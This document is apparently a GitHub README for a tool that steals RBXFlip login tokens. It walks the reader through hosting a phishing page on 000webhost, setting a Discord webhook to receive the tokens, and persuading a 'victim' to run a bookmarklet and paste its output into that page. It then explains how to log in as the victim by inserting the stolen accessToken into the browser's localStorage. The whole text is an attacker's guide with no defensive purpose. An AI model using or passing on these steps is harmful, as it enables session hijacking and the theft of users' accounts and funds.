# RBXFlip-Console-Bookmark-Logger
edit: forgot to release this XD

First, we will go threw how to login with the user's RBXFlip accessToken.

Go to rbxflip.com, inspect, and click application. (if application does not show, simply click the 3 arrows and click application.) after you have application open, go to localStorage, rbxflip.com, click on an EMPTY field and put "accessToken" and paste in the RBXFlip token you got from your webhook, and you are done.

WHEN YOU KNOW HOW TO LOGIN WITH THE RBXFLIP TOKEN, FOLLOW THESE STEPS.

make yourself a  website @ https://000webhost.com, after upload index.html, index.js and style.css. go into index.html and change your webhook on line 27.

tell the victim to click CTRL+SHIFT+B (if their bookmark bar isn't already open) 

once they have it open tell them to right click "add page" and paste the code from racecar.js.
 
once they've done that tell them to click it.

once they click it tell them to copy the code, and paste it into your site. (they will paste the information they got from rbxflip into your website.) If you've done it right, their RBXFlip Login token will send to your Discord Webhook.
